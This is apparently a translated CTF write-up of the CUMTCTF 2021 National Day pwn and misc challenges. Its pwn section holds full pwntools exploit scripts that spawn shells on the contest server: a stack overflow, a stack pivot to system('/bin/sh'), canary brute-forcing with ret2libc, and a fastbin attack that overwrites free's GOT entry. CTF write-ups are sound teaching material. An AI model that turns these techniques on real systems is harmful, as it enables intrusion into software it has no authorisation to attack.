---
title: Selected CUMTCTF National Day challenges, 2021
translation_id: cumt-national-day
source_digest: dbbbdc0e0a4292e7adaae8d655255d9cf397a828f306e96984e47ce54820b313
tags:
  - Pwn
  - Misc
categories:
  - Cybersecurity
  - CTF
sections: {"encryption": "加密", "social-engineering": "社工"}
---

## PWN

### pwn1

I connected with `nc` and ran `cat flag` to read the flag.

### pwn2

A classic stack overflow.
![image-20211122230815230](https://res.cloudinary.com/sycamore/image/upload/v1792696575/Typora/2021/11/2d25d53292a7b5602fd11b9e1127bcf1.png)

```python
from pwn import *

#r=process("./pwn2")
r=remote('1.15.81.218',10001)

p=b'a' * 72 + p64(0x400596)
r.sendline(p)

r.interactive()
```

Just send it as-is...

### pwn3

NX was enabled, but there was no stack canary.


![image-20211122230949625](https://res.cloudinary.com/sycamore/image/upload/v1792696576/Typora/2021/11/0ac847eebeec27d62e811700f99b5b71.png)

I spotted an `echo flag` that looked promising, but it turned out to be a dead end.

So I still had to use `system`.

![image-20211122230831039](https://res.cloudinary.com/sycamore/image/upload/v1792696577/Typora/2021/11/b3a274b13eede296b71c54165bc95d53.png)

The buffer s was 0x28 bytes and I could overflow it by only 0x8 bytes. That left little room, but the program read twice. I used the first read to leak ebp, wrote the call to system("/bin/sh") on the second, and used leave; ret to pivot the stack into s.

To pivot into s I needed its address. In the debugger I measured its distance from ebp.

The difference was 0xffffc1f8 − 0xffffc1c0 = 0x38.

To get ebp:

```python
p = b'a'*0x27+b'b'
r.send(p)
r.recvuntil(b'b')
ebp = u32(r.recv(4))
```

Subtracting 0x38 from the leaked ebp gave the address of s.

The complete script:

```python
from pwn import *

r=process('./pwn3')
#r=remote('1.15.81.218',10002)

sys_addr=0x8048400
leave_ret=0x08048562
main_addr=0xdeadbeef

p=b'a'*0x27+b'b'
r.send(p)
r.recvuntil(b'b')
s_addr=ebp=u32(r.recv(4))-0x38  # ebp-s=0x38
print(s_addr)

p2=b'aaaa'+p32(sys_addr)+p32(main_addr)+p32(s_addr+0x10)+b"/bin/sh"
p2=p2.ljust(0x28,b'\x00')  # /bin/sh添上\x00
p2+=p32(s_addr)+p32(leave_ret)  # hijack s
r.send(p2)

r.interactive()
```

### brute?

This one called for brute-forcing the stack canary.
```python
from pwn import *
from LibcSearcher import *

#r = process('./brute')
r=remote('1.15.81.218',20000)
canary = b'\x00'
def find():
    global canary,r
    #r = process('./brute')
    r=remote('1.15.81.218',20000)
    print(r.recvuntil(b'2021!\n'))
    canary = b'\x00'
    for j in range(3):
        for i in range(0x100):
            r.send(b'a'*100 + canary + bytes(chr(i).encode()))
            a = r.recvuntil(b'2021!\n')
            if b'Successfully' in a:
                canary += bytes(chr(i).encode())
                print(canary)
                break
    if(len(canary)!=4):
        find()

find()
print(canary)

elf = ELF('./brute')
system = elf.plt['system']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x08048560
p1 = b'a' * 100 + canary +b'a'*12+ p32(puts_plt) + p32(main) + p32(puts_got)
#print(r.recvuntil(b'2021!\n'))
r.sendline(p1)

puts_addr = u32(r.recv()[0:4])
print('puts_addr:',puts_addr)
libc = LibcSearcher('puts',puts_addr)
base = puts_addr - libc.dump('puts')
sys_addr = base + libc.dump('system')
bin_sh = base + libc.dump('str_bin_sh')
p2 = b'a' * 100 + canary +b'a'*12+ p32(sys_addr) +  b'a' * 4 + p32(bin_sh)
r.sendline(p2)

r.interactive()
```
That took forever...
`CUMTCTF{5305918b-e080-4f2d-b9b1-8a6f3ed727d5}`

### pwn4

The edit operation had a heap overflow.

l33t was the backdoor. To reach it, the unsigned 64-bit magic value in .bss had to exceed 0x1305.

An unsorted-bin attack could replace magic with the bin address, which exceeded that threshold.

...

That caught me out...

It wasn’t even in that directory...

I thought I could change the command string passed to system, but it lived in read-only .rodata.

![image-20211122230855187](https://res.cloudinary.com/sycamore/image/upload/v1792696581/Typora/2021/11/4c2f5f1d77fee1973ed990605f1b4cee.png)


Back to the drawing board.

I needed control of heaparray.

I used a fake chunk to set heaparray[0] to free’s GOT entry, then used edit() to replace that entry with system.

Freeing a chunk containing /bin/sh followed by a null byte would then give me a shell. I could create the chunk in advance and trigger free via delete_heap.

For the fake chunk, I could allocate two more chunks, free the first and overflow the other to change the first chunk’s fd pointer to the fake chunk.

```python
from pwn import *

#r=process("./pwn4")
r=remote('1.15.81.218', 10003)
elf=ELF("./pwn4")

heaparray=0x006020E0
fake_fastbin=0x6020ad
system_addr=0x400C2C
free_got=elf.got["free"]

def create(size,content):
    r.recvuntil("Your choice :")
    r.sendline(str(1))
    r.recvuntil("Size of Heap : ")
    r.sendline(str(size))
    r.recvuntil("Content of heap:")
    r.sendline(content)
    r.recvuntil("SuccessFul")

def delete(index):
    r.recvuntil("Your choice :")
    r.sendline(str(3))
    r.recvuntil("Index :")
    r.sendline(str(index))
    r.recvuntil("Done !")

def edit(index,size,content):
    r.recvuntil("Your choice :")
    r.sendline(str(2))
    r.recvuntil("Index :")
    r.sendline(str(index))
    r.recvuntil("Size of Heap : ")
    r.sendline(str(size))
    r.recvuntil("Content of heap : ")
    r.sendline(content)
    r.recvuntil("Done !")

create(0x10,b'a' * 0x10)  # idx0
create(0x10,b'a' * 0x10)  # idx1
create(0x60,b'b' * 0x10)  # idx2
create(0x10,b'/bin/sh\x00')  # id3
delete(2)
edit(1,0x30,0x10 * b'a' + p64(0) + p64(0x71) + p64(0x6020ad) + p64(0))

create(0x60,b'd' * 0x10)  # idx1
p=0x23 * b'e' + p64(free_got)
create(0x60,p)  # idx4
edit(0,0x8,p64(0x400C2C))

r.recvuntil(b"Your choice :")
r.sendline(str(3))
r.recvuntil(b"Index :")
r.sendline(str(3))

r.interactive()
```


### lcg
I followed the calculation in this post: https://blog.csdn.net/superprintf/article/details/108964563
```python
from Crypto.Util.number import *

def gcd(a,b):
    if(b==0):
        return a
    else:
        return gcd(b,a%b)

s = [64053834035066785058511795263859088093402576718387054930069870694827422995248363210875296865931156540418540088656840163752864867889701529, 62747878069691338351001678737533032651009187924993079609551517187402239263500990458468121965725468864035542647616568888614971291913860683, 8610389166165547798963079074461089122942923569827711232062490735297527674581120584017030806864406444034839689358368567214353599295961192, 67368398051089407366868405625671942347378755129423872678285919732014302509367453094142041707571135936337763803644340301362544880144675515, 3140546334522640626644397935274312967014650101920766829848908314358452633165879115222769049730993718556007257838431843662986174886332684, 86570894867827558107244361752089586436766881136739525172025909326268148819720261812567282066327259810017581923500053674785415315313293458, 74270633946662538117925791534180331044438757906314082041974053142483165604719102121031974214138125154407150853174565679126633465007917723, 82222345180880564316408536364709779418528442531150999715627704885024880160675971236916036110841803202987616501846568355385621016171784903, 79833541796675422937999973936505826001046326324194169378072775519666431460490483847928549009565561011528302879850550395115321828798479473, 70276250399219459795079058514491950109021040664671993784167534811426903455184545174600178849521746939676479421177456528336980088529680364]
t = []
for i in range(9):
    t.append(s[i]-s[i-1])
all_n = []
for i in range(7):
    all_n.append(gcd((t[i+1]*t[i-1]-t[i]*t[i]), (t[i+2]*t[i]-t[i+1]*t[i+1])))

MMI = lambda A, n,s=1,t=0,N=0: (n < 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n<1] #逆元计算
for n in all_n:
    n=abs(n)
    if n==1:
        continue
    print (n)
    a=(s[2]-s[1])*MMI((s[1]-s[0]),n)%n
    a_phi=MMI(a,n)
    b=(s[1]-a*s[0])%n
    seed = (a_phi*(s[0]-b))%n
    print(long_to_bytes(seed))
```

## Misc

### Encryption?
The dancing figures spelled SHERLOCK.

The text file looked empty. Inspecting the underlying characters revealed a zero-width message: JKGASwqeeh!@$.

The next layer was hexadecimal: 63756D746374667B69745F69735F63727970746F3F7D.

Decoding it gave `cumtctf{it_is_crypto?}`
### Social engineering?
I missed a detail the first time: the slash in WANG/JIA has to stay.

I scanned the barcode on the boarding pass here: [https://demo.dynamsoft.com/barcode-reader/](https://demo.dynamsoft.com/barcode-reader/)

The result was:

![image-20211122230905993](https://res.cloudinary.com/sycamore/image/upload/v1792696579/Typora/2021/11/6761b9a34806e510c91173b2704cebfa.png)


I looked up the boarding-pass barcode format to interpret the fields.

M1 is the name of the passenger.

flag : `cumtctf{WANG/JIA}`
